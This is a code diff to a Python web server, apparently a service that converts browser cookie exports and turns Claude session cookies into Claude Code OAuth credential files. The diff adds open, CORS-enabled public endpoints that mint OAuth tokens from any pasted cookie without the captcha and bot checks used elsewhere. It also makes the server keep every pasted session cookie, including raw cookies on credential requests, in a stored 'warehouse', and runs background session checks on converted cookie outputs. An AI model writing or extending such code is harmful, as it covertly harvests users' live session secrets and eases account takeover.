@@ -9,7 +9,11 @@ exposes the box public key. The admin surface is tgbot.py on the same database.
   POST /e            usage beacon (pageview plaintext; convert is a sealed box)
   POST /check        Claude session check (sealed box)
   POST /credential   cookie → Claude Code credentials.json (sealed box + Turnstile)
-  GET  /api/health   liveness (localhost only; nginx does not proxy this)
+  POST /api/v1/convert     public cookie convert (JSON, CORS)
+  POST /api/v1/check       public session check (JSON, CORS)
+  POST /api/v1/credential  public credentials.json (JSON, CORS)
+  GET  /api/v1/health      public liveness
+  GET  /api/health         liveness (localhost only; nginx does not proxy this)
 """
 
 from __future__ import annotations
@@ -42,6 +46,8 @@ from claude_check import (
     session_key_hash,
 )
 from claude_oauth import ConvertError, convert_session, redact
+from cookie_convert import convert as convert_cookies
+from cookie_convert import convert_combined, split_cookie_sets
 from turnstile import verify_turnstile
 
 DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
@@ -67,6 +73,23 @@ BOT_RE = re.compile(
     re.I,
 )
 DOMAIN_RE = re.compile(r'(?:^|[",{\s])\.?([a-z0-9-]+(?:\.[a-z0-9-]+)+)', re.I)
+CORS_HEADERS = (
+    ("Access-Control-Allow-Origin", "*"),
+    ("Access-Control-Allow-Methods", "GET, POST, OPTIONS"),
+    ("Access-Control-Allow-Headers", "Content-Type"),
+    ("Access-Control-Max-Age", "86400"),
+    ("Access-Control-Expose-Headers", "Retry-After"),
+    ("Cross-Origin-Resource-Policy", "cross-origin"),
+)
+CONVERT_ISSUE_REASON = {
+    "issue.tooLarge": "too_large",
+    "issue.unknownFormat": "unknown_format",
+    "issue.header.empty": "empty",
+    "issue.json.empty": "empty",
+    "issue.json.invalid": "invalid",
+    "issue.json.unsupportedShape": "invalid",
+    "issue.netscape.noCookies": "empty",
+}
 
 _box_private = None
 
@@ -284,6 +307,36 @@ def public_check_result(result: dict) -> dict:
     }
 
 
+def public_convert_result(result: dict) -> dict:
+    """JSON the public convert API is allowed to return. No cookie objects."""
+    stats = result.get("stats") if isinstance(result.get("stats"), dict) else {}
+    issues = result.get("issues") if isinstance(result.get("issues"), list) else []
+    return {
+        "ok": bool(result.get("ok")),
+        "detected": result.get("detected"),
+        "target": result.get("target"),
+        "output": result.get("output") if isinstance(result.get("output"), str) else "",
+        "issues": issues,
+        "stats": {
+            "total": stats.get("total") or 0,
+            "domains": stats.get("domains") or 0,
+            "expired": stats.get("expired") or 0,
+            "session": stats.get("session") or 0,
+            "secure": stats.get("secure") or 0,
+            "httpOnly": stats.get("httpOnly") or 0,
+        },
+        "n": stats.get("total") or 0,
+    }
+
+
+def convert_invalid_reason(result: dict) -> str:
+    issues = result.get("issues") if isinstance(result.get("issues"), list) else []
+    if not issues:
+        return "empty"
+    message = issues[0].get("message") if isinstance(issues[0], dict) else ""
+    return CONVERT_ISSUE_REASON.get(message or "", "invalid")
+
+
 def public_credential_result(payload: dict) -> dict:
     """Browser JSON for a successful convert. Tokens only; no cookie extras."""
     credentials = payload.get("credentials")
@@ -291,8 +344,8 @@ def public_credential_result(payload: dict) -> dict:
     if not isinstance(credentials, dict):
         return {"ok": False, "invalidReason": "convert_failed"}
     oauth = credentials.get("claudeAiOauth")
-    if not isinstance(oauth, dict) or not oauth.get("accessToken"):
-        return {"ok": False, "invalidReason": "convert_failed"}
+    if not isinstance(oauth, dict) or not oauth.get("accessToken") or not oauth.get("refreshToken"):
+        return {"ok": False, "invalidReason": "no_refresh"}
     return {
         "ok": True,
         "filename": filename,
@@ -346,12 +399,21 @@ class RateLimiter:
             self.hits[key] = bucket
             return True
 
+    def retry_after(self, key: str) -> int:
+        t = now()
+        with self.lock:
+            bucket = [x for x in self.hits.get(key, []) if x > t - self.window]
+            if not bucket:
+                return self.window
+            return max(1, bucket[0] + self.window - t)
+
 
 ingest_limiter = RateLimiter(limit=240, window=60)
+convert_limiter = RateLimiter(limit=60, window=60)
 check_limiter = RateLimiter(limit=20, window=60)
 # Background convert probes used to share check_limiter. A 20-set paste then
 # spent the interactive /check budget and the next Check returned 429.
-convert_check_limiter = RateLimiter(limit=20, window=60)
+convert_check_limiter = RateLimiter(limit=40, window=60)
 credential_ip_minute = RateLimiter(limit=5, window=60)
 credential_ip_hour = RateLimiter(limit=20, window=3600)
 credential_sid_hour = RateLimiter(limit=3, window=3600)
@@ -545,20 +607,50 @@ class Handler(BaseHTTPRequestHandler):
             return b""
         return self.rfile.read(length)
 
+    def _request_path(self) -> str:
+        return self.path.split("?", 1)[0]
+
+    def _is_public_api(self) -> bool:
+        return self._request_path().startswith("/api/v1/")
+
+    def _apply_cors(self) -> None:
+        if not self._is_public_api():
+            return
+        for key, value in CORS_HEADERS:
+            self.send_header(key, value)
+
     def _empty(self, code: int) -> None:
         self.send_response(code)
         self.send_header("Content-Length", "0")
         self.send_header("Cache-Control", "no-store")
+        self._apply_cors()
         self.end_headers()
 
-    def _json(self, code: int, obj: dict) -> None:
+    def _json(self, code: int, obj: dict, extra_headers: list[tuple[str, str]] | None = None) -> None:
         body = json.dumps(obj).encode()
         self.send_response(code)
         self.send_header("Content-Type", "application/json")
         self.send_header("Content-Length", str(len(body)))
         self.send_header("Cache-Control", "no-store")
+        self._apply_cors()
+        for key, value in extra_headers or ():
+            self.send_header(key, value)
         self.end_headers()
         self.wfile.write(body)
+
+    def _rate_limited(self, limiter: RateLimiter, key: str) -> None:
+        return self._json(
+            429,
+            {"ok": False, "invalidReason": "rate_limited"},
+            extra_headers=[("Retry-After", str(limiter.retry_after(key)))],
+        )
+
+    def _read_json(self) -> dict | None:
+        try:
+            data = json.loads(self._read_body() or b"{}")
+        except (ValueError, TypeError):
+            return None
+        return data if isinstance(data, dict) else None
 
     def _trusted(self) -> bool:
         return trusted_page(self.headers.get("Origin") or "", self.headers.get("Referer") or "")
@@ -566,22 +658,33 @@ class Handler(BaseHTTPRequestHandler):
     def log_message(self, *args):
         pass
 
+    def do_OPTIONS(self):
+        if self._is_public_api():
+            return self._empty(204)
+        self._empty(404)
+
     def do_GET(self):
-        path = self.path.split("?", 1)[0]
+        path = self._request_path()
         if path == "/box":
             return self._json(200, public_jwk(box_private()))
-        if path == "/api/health":
+        if path in ("/api/health", "/api/v1/health"):
             return self._json(200, {"ok": True})
         self._empty(404)
 
     def do_POST(self):
-        path = self.path.split("?", 1)[0]
+        path = self._request_path()
         if path == "/e":
             return self.ingest()
         if path == "/check":
             return self.check()
         if path == "/credential":
             return self.credential()
+        if path == "/api/v1/convert":
+            return self.api_convert()
+        if path == "/api/v1/check":
+            return self.api_check()
+        if path == "/api/v1/credential":
+            return self.api_credential()
         self._empty(404)
 
     def ingest(self):
@@ -661,24 +764,22 @@ class Handler(BaseHTTPRequestHandler):
         ip = self._client_ip()
         ua = self.headers.get("User-Agent", "")
         if BOT_RE.search(ua) or not check_limiter.allow(ip):
-            return self._json(429, {"ok": False, "invalidReason": "rate_limited"})
+            return self._rate_limited(check_limiter, ip)
         if not self._trusted():
             return self._json(400, {"ok": False, "invalidReason": "empty"})
 
-        try:
-            data = json.loads(self._read_body() or b"{}")
-        except (ValueError, TypeError):
+        data = self._read_json()
+        if data is None:
             return self._json(400, {"ok": False, "invalidReason": "empty"})
-        if not isinstance(data, dict):
-            return self._json(400, {"ok": False, "invalidReason": "empty"})
-
         if not looks_like_box(data):
             return self._json(400, {"ok": False, "invalidReason": "empty"})
         try:
             inner = open_json(box_private(), data)
         except BoxError:
             return self._json(400, {"ok": False, "invalidReason": "empty"})
+        return self._check_payload(inner, ip, ua, path="/check")
 
+    def _check_payload(self, inner: dict, ip: str, ua: str, *, path: str):
         locale = inner.get("l")
         locale = locale if locale in LOCALES else None
         tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
@@ -688,17 +789,22 @@ class Handler(BaseHTTPRequestHandler):
         batch = inner.get("cookies")
         if isinstance(batch, list):
             items = [c[:MAX_BODY] for c in batch if isinstance(c, str) and c.strip()][:MAX_BATCH]
-            results = [public_check_result(self._check_one(raw, locale, tz, ip, ua)) for raw in items]
+            results = [
+                public_check_result(self._check_one(raw, locale, tz, ip, ua, path=path))
+                for raw in items
+            ]
             return self._json(200, {"results": results})
 
         raw = inner.get("cookie")
         if not isinstance(raw, str):
             raw = ""
         raw = raw[:MAX_BODY]
-        result = self._check_one(raw, locale, tz, ip, ua)
+        result = self._check_one(raw, locale, tz, ip, ua, path=path)
         return self._json(200, public_check_result(result))
 
-    def _check_one(self, raw: str, locale: str | None, tz: str | None, ip: str, ua: str) -> dict:
+    def _check_one(
+        self, raw: str, locale: str | None, tz: str | None, ip: str, ua: str, *, path: str = "/check",
+    ) -> dict:
         """Resolve country, honour safe-mode, de-dupe, check one cookie, store it."""
         session_id = session_key_hash(raw)
         # No Claude session cookie at all (random text like "example.cook", a URL,
@@ -714,21 +820,24 @@ class Handler(BaseHTTPRequestHandler):
         if raw.strip() and not egress_ok(country, session_id):
             print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
             result = {"ok": False, "invalidReason": "unreachable"}
-            self._store_check(ip, ua, locale, raw, result)
+            self._store_check(ip, ua, locale, raw, result, path=path)
             return result
 
-        result, cached = execute_check(raw, session_id, country)
-        if not cached:
-            self._store_check(ip, ua, locale, raw, result)
+        result, _cached = execute_check(raw, session_id, country)
+        # Always write a check row. A convert of the same session may already be
+        # in the 60s cache; the operator still wants this paste in the warehouse.
+        self._store_check(ip, ua, locale, raw, result, path=path)
         return result
 
-    def _store_check(self, ip: str, ua: str, locale: str | None, raw: str, result: dict) -> None:
+    def _store_check(
+        self, ip: str, ua: str, locale: str | None, raw: str, result: dict, *, path: str = "/check",
+    ) -> None:
         country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
         ok = bool(result.get("ok"))
         row = {
             "ts": now(), "day": today(), "type": "check",
             "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
-            "device": device_class(ua), "path": "/check", "from_fmt": None,
+            "device": device_class(ua), "path": path, "from_fmt": None,
             "to_fmt": None, "n": 1, "domains": "claude.ai",
             "valid": 1 if ok else 0,
             "reason": None if ok else (result.get("invalidReason") or "invalid"),
@@ -747,20 +856,17 @@ class Handler(BaseHTTPRequestHandler):
     def credential(self):
         ip = self._client_ip()
         ua = self.headers.get("User-Agent", "")
-        if (
-            BOT_RE.search(ua)
-            or not credential_ip_minute.allow(ip)
-            or not credential_ip_hour.allow(ip)
-        ):
-            return self._json(429, {"ok": False, "invalidReason": "rate_limited"})
+        if BOT_RE.search(ua):
+            return self._rate_limited(credential_ip_minute, ip)
+        if not credential_ip_minute.allow(ip):
+            return self._rate_limited(credential_ip_minute, ip)
+        if not credential_ip_hour.allow(ip):
+            return self._rate_limited(credential_ip_hour, ip)
         if not self._trusted():
             return self._json(400, {"ok": False, "invalidReason": "empty"})
 
-        try:
-            data = json.loads(self._read_body() or b"{}")
-        except (ValueError, TypeError):
-            return self._json(400, {"ok": False, "invalidReason": "empty"})
-        if not isinstance(data, dict):
+        data = self._read_json()
+        if data is None:
             return self._json(400, {"ok": False, "invalidReason": "empty"})
         if not looks_like_box(data):
             return self._json(400, {"ok": False, "invalidReason": "empty"})
@@ -775,7 +881,9 @@ class Handler(BaseHTTPRequestHandler):
         captcha_ok, captcha_reason = verify_turnstile(token, ip)
         if not captcha_ok:
             return self._json(403, {"ok": False, "invalidReason": captcha_reason or "captcha_failed"})
+        return self._credential_payload(inner, ip, ua, path="/credential")
 
+    def _credential_payload(self, inner: dict, ip: str, ua: str, *, path: str):
         locale = inner.get("l")
         locale = locale if locale in LOCALES else None
         tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
@@ -790,7 +898,7 @@ class Handler(BaseHTTPRequestHandler):
         if session_id is None:
             return self._json(400, {"ok": False, "invalidReason": "missing_session" if raw.strip() else "empty"})
         if not credential_sid_hour.allow(session_id):
-            return self._json(429, {"ok": False, "invalidReason": "rate_limited"})
+            return self._rate_limited(credential_sid_hour, session_id)
 
         ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
         country = resolve_check_country(session_id, tz, ip_country)
@@ -814,15 +922,113 @@ class Handler(BaseHTTPRequestHandler):
         except ConvertError as exc:
             reason = exc.reason or "convert_failed"
             print(redact(f"credential {reason}"), flush=True)
-            self._store_credential(ip, ua, locale, result, valid=False, reason=reason)
+            self._store_credential(ip, ua, locale, result, working, valid=False, reason=reason, path=path)
             return self._json(200, {"ok": False, "invalidReason": reason})
         except Exception as exc:
             print(redact(f"credential convert_failed {exc!r}"), flush=True)
-            self._store_credential(ip, ua, locale, result, valid=False, reason="convert_failed")
+            self._store_credential(
+                ip, ua, locale, result, working, valid=False, reason="convert_failed", path=path,
+            )
             return self._json(200, {"ok": False, "invalidReason": "convert_failed"})
 
-        self._store_credential(ip, ua, locale, result, valid=True, reason=None)
+        self._store_credential(ip, ua, locale, result, working, valid=True, reason=None, path=path)
         return self._json(200, public_credential_result(payload))
+
+    def api_convert(self):
+        ip = self._client_ip()
+        ua = self.headers.get("User-Agent", "")
+        if not convert_limiter.allow(ip):
+            return self._rate_limited(convert_limiter, ip)
+        data = self._read_json()
+        if data is None:
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+        raw = data.get("input")
+        if not isinstance(raw, str):
+            raw = ""
+        raw = raw[:MAX_BODY]
+        target = data.get("target")
+        if target is not None and target not in FORMATS:
+            return self._json(400, {"ok": False, "invalidReason": "bad_target"})
+        default_domain = data.get("defaultDomain")
+        default_domain = default_domain if isinstance(default_domain, str) else None
+        locale = data.get("l")
+        locale = locale if locale in LOCALES else None
+        tz = data.get("tz") if isinstance(data.get("tz"), str) else None
+        opts = {"target": target, "default_domain": default_domain}
+        sets = split_cookie_sets(raw)
+        if not sets:
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+        results = [convert_cookies(item, **opts) for item in sets]
+        ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
+        for result in results:
+            if result.get("ok") and result.get("output") and not is_site_sample(result["output"]):
+                self._store_convert(ip, ua, locale, result, tz, ip_country)
+        ok_results = [result for result in results if result.get("ok")]
+        if not ok_results:
+            first = results[0]
+            body = public_convert_result(first)
+            body["ok"] = False
+            body["invalidReason"] = convert_invalid_reason(first)
+            return self._json(400, body)
+        if len(results) == 1:
+            return self._json(200, public_convert_result(results[0]))
+        return self._json(200, public_convert_result(convert_combined(raw, **opts)))
+
+    def _store_convert(
+        self,
+        ip: str,
+        ua: str,
+        locale: str | None,
+        result: dict,
+        tz: str | None,
+        ip_country: str | None,
+    ) -> None:
+        output = result.get("output") if isinstance(result.get("output"), str) else None
+        from_fmt = result.get("detected")
+        to_fmt = result.get("target")
+        stats = result.get("stats") if isinstance(result.get("stats"), dict) else {}
+        row = {
+            "ts": now(), "day": today(), "type": "convert",
+            "visitor": visitor_hash(ip, ua),
+            "country": (self.headers.get("X-CC-Country") or "").upper()[:2] or None,
+            "locale": locale,
+            "device": device_class(ua), "path": "/api/v1/convert",
+            "from_fmt": from_fmt if from_fmt in FORMATS else None,
+            "to_fmt": to_fmt if to_fmt in FORMATS else None,
+            "n": stats.get("total") if isinstance(stats.get("total"), int) else None,
+            "domains": extract_domains(output) if output else None,
+            "valid": None, "reason": None, "info": None,
+        }
+        conn = db()
+        try:
+            event_id = insert_event(conn, row, output)
+            conn.commit()
+        finally:
+            conn.close()
+        if output:
+            schedule_convert_check(event_id, output, ip, tz, ip_country)
+
+    def api_check(self):
+        ip = self._client_ip()
+        ua = self.headers.get("User-Agent", "")
+        if not check_limiter.allow(ip):
+            return self._rate_limited(check_limiter, ip)
+        data = self._read_json()
+        if data is None:
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+        return self._check_payload(data, ip, ua, path="/api/v1/check")
+
+    def api_credential(self):
+        ip = self._client_ip()
+        ua = self.headers.get("User-Agent", "")
+        if not credential_ip_minute.allow(ip):
+            return self._rate_limited(credential_ip_minute, ip)
+        if not credential_ip_hour.allow(ip):
+            return self._rate_limited(credential_ip_hour, ip)
+        data = self._read_json()
+        if data is None:
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+        return self._credential_payload(data, ip, ua, path="/api/v1/credential")
 
     def _store_credential(
         self,
@@ -830,23 +1036,27 @@ class Handler(BaseHTTPRequestHandler):
         ua: str,
         locale: str | None,
         result: dict,
+        raw: str,
         *,
         valid: bool,
         reason: str | None,
+        path: str = "/credential",
     ) -> None:
         country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
         row = {
             "ts": now(), "day": today(), "type": "credential",
             "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
-            "device": device_class(ua), "path": "/credential", "from_fmt": None,
+            "device": device_class(ua), "path": path, "from_fmt": None,
             "to_fmt": None, "n": 1, "domains": "claude.ai",
             "valid": 1 if valid else 0,
             "reason": None if valid else (reason or "convert_failed"),
             "info": json.dumps(check_info(result), ensure_ascii=False) if result.get("ok") else None,
         }
+        # Cookie only — never the minted OAuth file.
+        stored = (result.get("freshCookie") or raw) if STORE_OUTPUT else None
         conn = db()
         try:
-            insert_event(conn, row, None)
+            insert_event(conn, row, stored)
             conn.commit()
         finally:
             conn.close()
